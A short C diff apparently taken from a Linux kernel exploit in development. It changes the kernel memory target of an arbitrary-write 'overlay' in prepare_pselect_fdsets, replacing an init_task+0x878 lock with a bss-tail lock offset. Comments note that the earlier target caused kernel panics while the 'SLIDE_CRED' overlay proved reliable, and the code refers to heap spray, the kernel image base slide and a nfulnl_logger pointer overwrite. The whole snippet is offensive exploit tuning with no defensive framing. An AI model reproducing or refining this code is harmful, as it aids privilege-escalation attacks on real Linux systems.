@@ -1232,10 +1232,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               pi_parent = 0;
               pi_right = 0;
               pi_left = 0;
-              /* Park overlay: O26–O28 KP'd with spray lock at pre-select. */
+              /* Park overlay: O26–O28 KP'd with spray lock at pre-select.
+               * 09-13: the init_task+0x878/prio3 overlay is KP-cold
+               * (oracle fires died at walk1 2/2); the SLIDE_CRED overlay
+               * (bss_tail lock, prio 0) survived all day — use it. */
               stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
-              stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
-              stack_prio = 3;
+              stack_lock = data_addr(KIMAGE_TEXT_BASE +
+                  (active_offsets && active_offsets->off_bss_tail_lock
+                       ? (uint64_t)active_offsets->off_bss_tail_lock
+                       : 0x02BB9D00ULL));
+              stack_prio = 0;
               stack_deadline = 0;
               pr_info("stack mode4 SLIDE NOSPRAY: *%016llx = %016llx "
                       "(nfulnl_logger → boot_id) lock=init_task+0x878\n",
